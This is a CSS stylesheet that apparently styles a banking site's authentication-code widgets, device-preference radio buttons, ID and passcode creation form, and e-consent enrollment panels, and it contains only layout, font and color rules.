        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .no-float {
            float: none !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #ah-widget-modal-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #ah-widget-modal-wrapper {
            overflow: hidden
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-header--2,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-header--2 {
            font: 14px "cnx-medium", Arial, Helvetica, sans-serif;
            color: #524940
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-header--2,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-header--2 {
                font-size: 16px
            }
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-header--2,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-header--2 {
                line-height: 18px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-header--2a,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-header--2a {
            font: 22px "cnx-regular", Arial, Helvetica, sans-serif;
            color: #000
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-header--2a,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-header--2a {
                font-size: 22px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--1,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--1 {
            font: 18px "cnx-regular", Arial, Helvetica, sans-serif;
            color: #6b5e51
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--1,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--1 {
                font-size: 18px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--2,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--2 {
            font: 18px Arial, Helvetica, sans-serif;
            line-height: 20px;
            color: #524940
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--2a,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--2a {
            font: 16px Arial, Helvetica, sans-serif;
            line-height: 18px;
            color: #524940
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--2a,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--2a {
                font: 18px;
                line-height: 20px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--2b,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--2b {
            font: 16px Arial, Helvetica, sans-serif;
            line-height: 18px;
            color: #524940
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--3,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--3 {
            font: 12px "cnx-regular", Arial, Helvetica, sans-serif;
            color: #6b5e51
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--3,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--3 {
                font-size: 12px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--4,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--4 {
            font: 12px Arial, Helvetica, sans-serif;
            color: #000
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--4,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--4 {
                font-size: 14px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--5b,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--5b {
            font: 14px Arial, Helvetica, sans-serif;
            color: #000;
            font-weight: bold
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-content--5b,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-content--5b {
                font-size: 16px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-link,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-link {
            color: #0052c2
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-small,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-small {
            font: 14px Arial, Helvetica, sans-serif;
            color: #524940
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-small,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-small {
                font-size: 14px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-small-emp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-small-emp {
            font: 14px Arial, Helvetica, sans-serif;
            color: #524940;
            font-weight: bold
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-small-emp,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-small-emp {
                font-size: 14px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-footer-small,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-footer-small {
            font: 12px Arial, Helvetica, sans-serif;
            color: #6B5E51
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-footer-small,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-footer-small {
                font-size: 12px;
                line-height: 16px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-main-normal,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-main-normal-emp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-main-normal,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-main-normal-emp {
            font-size: 16px;
            font-family: Arial, Helvetica, sans-serif;
            color: #000
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-main-normal,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-main-normal-emp,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-main-normal,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-main-normal-emp {
                font-size: 16px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .ah-otp-widget .ft-main-normal-emp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .ah-otp-widget .ft-main-normal-emp {
            font-weight: bold
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-10,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-10 {
            margin-bottom: 10px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-15,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-15 {
            margin-bottom: 15px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-20,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-20 {
            margin-bottom: 20px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-30,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-30 {
            margin-bottom: 30px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-40,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-40 {
            margin-bottom: 40px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-60,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-60 {
            margin-bottom: 60px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .mb-100,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .mb-100 {
            margin-bottom: 100px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .pb-20,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .pb-20 {
            padding-bottom: 20px !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .block,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .block {
            display: block !important;
            float: none !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .columns.no-pad,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .columns.no-pad {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .link,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .link {
            color: #0052C2
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .link:hover,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .link:focus,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .link:hover,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .link:focus {
            color: #012169
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .clearfix,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .clearfix {
            clear: both
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .fhidden,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .TODO-remove,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .fhidden,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .TODO-remove {
            display: none !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #global-auth-error .spartaMessage-icon,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #global-auth-error .spartaMessage-icon {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 80px;
            -ms-flex: 0 0 80px;
            flex: 0 0 40px;
            padding-top: 20px;
            float: left;
            margin-right: 10px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #global-auth-error .data-icon,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #global-auth-error .data-icon {
            margin: 0 auto;
            display: block;
            width: 30px;
            height: 30px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #global-auth-error .spartaMessage-title,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #global-auth-error .spartaMessage-title {
            font-size: 14px;
            font-weight: bold;
            line-height: 1.2
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #global-auth-error .spartaMessage-content,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #global-auth-error .spartaMessage-content {
            padding-top: 5px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #global-auth-error .spartaMessage-content p,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #global-auth-error .spartaMessage-content p {
            font-size: 14px;
            margin-bottom: 10px;
            margin-top: 0;
            padding-bottom: 0;
            line-height: 1.2
        }

        .ah-authcode-module-class-v-8-2-0-modalwindow {
            margin-top: 0
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 {
            font: 100% "cnx-regular", Arial, Helvetica, sans-serif;
            color: #333
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .title-text {
            font-family: "cnx-bold", Arial, Helvetica, sans-serif;
            font-size: 20px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .intro-text {
            font-size: 17px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 #record-device-title-container .red-bar {
            background: #dc1431;
            padding: 0 10px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 #record-device-title-container .title-wrapper {
            color: #fff;
            font-size: 14px;
            height: 45px;
            line-height: 15px;
            font-weight: bold
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section {
            background-color: #fff
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section btn-record-preferences {
            margin-right: 20px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section #recordDevicePreferncesRadio .spa-fieldset-label {
            display: none
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-options-wrapper {
            position: relative;
            font-size: 16px;
            line-height: 16px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-options-list--vertical {
            margin-bottom: 11px !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option-label {
            font: 14px "cnx-regular", Arial, Helvetica, sans-serif;
            padding: 0 0 0 10px;
            max-width: calc(100% - 16px) !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option-label .span-text {
            margin-top: 10px;
            display: inline-block !important;
            vertical-align: top;
            font-size: 13px !important;
            font-weight: normal !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option-label .span-text:first-child {
            margin-bottom: 14px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option--radio {
            width: 15px !important;
            height: 15px !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option--radio~.spa-input-check {
            width: 15px !important;
            height: 15px !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option--radio:hover~.spa-input-check:after {
            width: 6px !important;
            height: 6px !important;
            top: 3.5px !important;
            left: 3.5px !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-option--radio:checked~.spa-input-check:after {
            width: 6px !important;
            height: 6px !important;
            top: 3.5px !important;
            left: 3.5px !important
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .radio-button-wrapper .spa-input-options-hint {
            display: none
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .form-wrapper {
            padding-left: 15px;
            padding-right: 15px
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section action-buttons {
            padding-left: 14px;
            padding-right: 15px;
            font-size: 0
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section action-buttons .link {
            display: inline-block;
            line-height: 30px;
            color: #0052C2;
            font-size: 13px;
            vertical-align: top
        }

        [data-sparta-container] .ah-caw-dp-module-class-v-5-0-1 .record-device-preferences-section .link-preferences {
            display: inline-block;
            line-height: 15px;
            color: #0052C2;
            font-size: 13px;
            vertical-align: top
        }

        [data-sparta-container] .ah-create-id-passcode-module {
            font: 100% "cnx-regular", Arial, Helvetica, sans-serif;
            color: #000;
            background-color: #fff
        }

        [data-sparta-container] .ah-create-id-passcode-module h2 {
            font: 100% "cnx-regular";
            font-size: 22px
        }

        [data-sparta-container] .ah-create-id-passcode-module .page-number {
            font-family: "cnx-regular";
            font-size: 0.875em;
            color: #000
        }

        [data-sparta-container] .ah-create-id-passcode-module .mt-10 {
            margin-top: 10px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mt-20 {
            margin-top: 20px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mt-30 {
            margin-top: 30px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mt-40 {
            margin-top: 40px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mt-80 {
            margin-top: 80px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mb-10 {
            margin-bottom: 10px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mb-20 {
            margin-bottom: 20px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mb-30 {
            margin-bottom: 30px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mb-40 {
            margin-bottom: 40px
        }

        [data-sparta-container] .ah-create-id-passcode-module .mb-80 {
            margin-bottom: 80px
        }

        [data-sparta-container] .ah-create-id-passcode-module .input-help ul {
            margin-left: -5px
        }

        [data-sparta-container] .ah-create-id-passcode-module #btn-create-olbacct-cancel {
            background-color: #e7e7e7;
            color: black;
            padding: 10px 35px
        }

        [data-sparta-container] .ah-create-id-passcode-module ul.valid-conditions,
        [data-sparta-container] .ah-create-id-passcode-module .valid-conditions li {
            list-style: none;
            background-repeat: no-repeat;
            background-position: left top;
            background-size: 14px;
            padding-left: 20px
        }

        [data-sparta-container] .ah-create-id-passcode-module ul.valid-conditions {
            margin-left: -20px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container {
            margin-bottom: 30px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .info-content {
            margin-top: 12px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .sa-description {
            font-size: 17px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .sa-description p {
            font-size: 17px !important;
            margin-top: 5px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container ul.list-options,
        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container ul.list-options li {
            list-style-type: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #enroll-options-outer-wrapper {
            overflow: hidden
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #enroll-options-container {
            font-size: 0
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option {
            display: inline-block;
            margin-right: 10px;
            padding-right: 6px;
            vertical-align: top;
            transition: 0.5s all linear;
            -webkit-transition: 0.5s all linear;
            -webkit-transition: all 600ms cubic-bezier(0.6, 0.04, 0.98, 0.335);
            -webkit-transition: all 600ms cubic-bezier(0.785, 0.135, 0.15, 0.86);
            transition: all 600ms cubic-bezier(0.785, 0.135, 0.15, 0.86);
            -webkit-transition: all 600ms cubic-bezier(0.6, -0.28, 0.735, 0.045);
            transition: all 600ms cubic-bezier(0.6, -0.28, 0.735, 0.045);
            transition: 0.4s all ease-in;
            -webkit-transition: 0.4s all ease-in
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option .input-wrapper {
            padding: 20px 14px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .agreement-text .bold {
            font-weight: bold
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .olb-agreement-text-sa .bold {
            font-weight: bold;
            font-size: 17px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .view-pdf {
            text-align: right;
            float: right;
            display: inline-block;
            height: 20px;
            line-height: 20px;
            font-size: 13px;
            padding-right: 12px;
            font-family: "cnx-regular", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .view-more {
            display: block;
            text-align: center;
            position: absolute;
            bottom: 0em;
            height: 4.8em;
            background: -webkit-linear-gradient(rgba(255, 255, 255, 0) 0%, #fff 80%);
            background-image: -webkit-linear-gradient(rgba(255, 255, 255, 0) 0%, white 80%);
            background-image: linear-gradient(rgba(255, 255, 255, 0) 0%, white 80%);
            background-image: -ms-linear-gradient(rgba(255, 255, 255, 0) 0%, white 80%);
            width: 100%;
            line-height: 1em;
            padding-top: 58px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-ecomm-consent {
            padding: 10px 35px;
            margin-right: 10px
        }

        @media only screen and (max-width: 480px) {
            [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-ecomm-consent {
                margin-left: 0px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content {
            font-family: "cnx-regular", Arial, Helvetica, sans-serif;
            font-size: 14px;
            line-height: 140%;
            color: #595959;
            overflow: hidden;
            background-color: #fff;
            padding: 6px;
            position: relative
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .view-pdf {
            text-align: right;
            float: right;
            display: inline-block;
            height: 20px;
            line-height: 20px;
            font-size: 13px;
            padding-right: 12px;
            font-family: "cnx-regular", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only h3 {
            font-family: "cnx-regular", Arial, Helvetica, sans-serif;
            line-height: 140%;
            font-size: 18px;
            color: #000
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .page-number {
            font-family: "cnx-regular";
            font-size: 0.875em;
            color: #000
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only p {
            font-family: "cnx-regular";
            font-size: 13px;
            line-height: 140%;
            color: #595959
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .agreement-text .bold {
            font-weight: bold
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .olb-agreement-text .bold {
            font-weight: bold
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .agg-section-content {
            margin-top: 20px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .agg-section .section-title {
            font-weight: bold
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.text-only .view-more-olb {
            display: block;
            text-align: center;
            position: absolute;
            bottom: 0em;
            height: 4.8em;
            background: -webkit-linear-gradient(rgba(255, 255, 255, 0) 0%, #fff 80%);
            background-image: -webkit-linear-gradient(rgba(255, 255, 255, 0) 0%, white 80%);
            background-image: linear-gradient(rgba(255, 255, 255, 0) 0%, white 80%);
            background-image: -ms-linear-gradient(rgba(255, 255, 255, 0) 0%, white 80%);
            width: 100%;
            line-height: 1em;
            padding-top: 58px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only {
            padding-bottom: 52px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only h3 {
            margin-top: 30px;
            font-family: "cnx-light", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .toggle-trigger-box {
            display: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .input-help .close-trigger {
            display: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .input-help ul {
            margin-bottom: 0
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .input-help ul.update-as-type {
            margin-left: 0;
            list-style: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .input-help ul.update-as-type li {
            list-style: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .input-wrapper {
            background-color: inherit;
            padding: 0;
            border: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only #ahOLBEnroll-COID-Error .spartaMessage {
            margin-top: 10px;
            margin-bottom: 26px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only #ahOLBEnroll-COID-Error .spartaMessage-icon {
            padding-bottom: 12px;
            margin-right: 0;
            padding-top: 12px;
            background: #f9dee1;
            -webkit-box-flex: 1;
            -webkit-flex: auto;
            -ms-flex: auto;
            flex: auto;
            width: 40px;
            max-width: 40px;
            text-align: center
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only #ahOLBEnroll-COID-Error .spartaMessage-icon .data-icon {
            margin: 0 auto;
            background-repeat: no-repeat;
            background-size: 20px;
            margin-left: 0;
            width: 24px;
            height: 24px;
            display: inline-block
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .spartaMessage-content {
            padding-bottom: 10px;
            padding-top: 0;
            word-break: break-word
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.input-only .spartaMessage-content .spartaMessage-title {
            font-size: 13px;
            font-weight: bold;
            line-height: 1.2;
            text-align: left;
            padding-left: 10px;
            margin-top: 12px;
            padding-bottom: 0;
            font-family: "cnx-medium", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step {
            padding-top: 30px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step .paperless-ico {
            display: inline-block
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step .option-title-text {
            display: inline-block;
            margin-left: 9px;
            vertical-align: top;
            line-height: 40px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step .option-content-wrapper {
            margin-top: 15px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step .input-wrapper {
            background-color: inherit;
            padding: 0;
            border: none;
            margin-top: 34px;
            margin-bottom: 34px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step .input-wrapper {
                margin-top: 24px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content.paperless-step .input-wrapper .spa-input-option-label {
            font-size: 16px;
            color: #524940
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-olb-consent {
            padding: 10px 35px;
            margin-left: 15px;
            margin-right: 20px
        }

        @media only screen and (max-width: 480px) {
            [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-olb-consent {
                margin-left: 0px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-olb-consent-cancel {
            color: black;
            padding: 10px 35px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-ecomm-consent {
            padding: 10px 35px;
            margin-left: 15px;
            margin-right: 20px
        }

        @media only screen and (max-width: 480px) {
            [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-ecomm-consent {
                margin-left: 0px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container #btn-ecomm-consent-cancel {
            color: black;
            padding: 10px 35px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content h3 {
            display: inline-block
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .enroll-option-content #closeIcon {
            display: none
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options {
            margin-top: 25px;
            margin-left: 0
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item {
            margin-bottom: 8px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item .bullet {
            display: inline-block;
            width: 25px;
            height: 25px;
            border-style: solid;
            text-align: center;
            border-radius: 100%;
            font-size: 15px;
            line-height: 25px;
            vertical-align: top;
            color: #8D8B89;
            border-color: #D4D2CE;
            border-width: 1px;
            font-family: "cnx-light", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item .list-item-content {
            margin-left: 9px;
            display: inline-block;
            line-height: 25px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item.active .bullet {
            color: #00AD50;
            font-family: "cnx-bold", Arial, Helvetica, sans-serif;
            border-width: 2px;
            border-color: #00AD50;
            line-height: 22px
        }

